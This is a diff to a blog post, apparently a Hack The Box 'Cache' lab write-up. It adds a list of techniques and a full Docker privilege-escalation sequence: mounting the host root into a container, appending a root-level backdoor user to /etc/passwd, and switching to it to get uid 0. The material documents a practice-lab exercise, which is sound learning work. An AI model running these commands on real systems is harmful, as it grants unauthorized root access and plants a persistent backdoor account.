@@ -3,10 +3,18 @@ title: HTB - Cache Write-up
 author: bigb0ss
 date: 2020-10-25 23:25:00 +0800
 categories: [Hack The Box, Linux, Medium]
-tags: [hackthebox, cache, vhost, openemr]
+tags: [hackthebox, cache, vhost, openemr, SQLi, memcached, docker, docker-privesc]
 ---
 
 ![image](/assets/img/post/htb/cache/01_infocard.png)
+
+This was a medium-difficulty box and good learning path to:
+* Client-side Auth Source Code Review
+* VHOST Enumeration
+* OpenEMR < 5.0.1 - Multiple SQLi
+* OpenEMR < 5.0.1 - Authenticatd Remote Code Execution
+* Memcached Exploit
+* Docker Privilege Escalation
 
 ## Recon
 
@@ -453,4 +461,37 @@ Password:
 $1$bigb0ss$BpDTAY12U2HOLINndbdWk/
 ```
 
-echo 'bigb0ss:$1$bigb0ss$BpDTAY12U2HOLINndbdWk/:0:0::/root:/bin/bash' >> etc/passwd
+Then, we need to add the user `bigb0ss` and its password salt into `/etc/passwd` file while logged in the docker session.
+
+```bash
+# Mounting the `/` directory to `/mnt`
+luffy@cache:~$ docker run -v /:/mnt -it ubuntu
+
+# Adding `bigb0ss` user
+root@a2fcb97125bd:/mnt# echo 'bigb0ss:$1$bigb0ss$BpDTAY12U2HOLINndbdWk/:0:0::/root:/bin/bash' >> etc/passwd
+
+# Verifying the `/etc/passwd`
+root@a2fcb97125bd:/mnt# tail etc/passwd
+tail etc/passwd
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+ash:x:1000:1000:ash:/home/ash:/bin/bash
+luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
+memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
+mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
+bigb0ss:$1$bigb0ss$BpDTAY12U2HOLINndbdWk/:0:0::/root:/bin/bash
+
+root@a2fcb97125bd:/mnt# exit
+exit
+
+luffy@cache:~$ su bigb0ss
+Password: test
+
+root@cache:/home/luffy# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Thanks for reading! :]
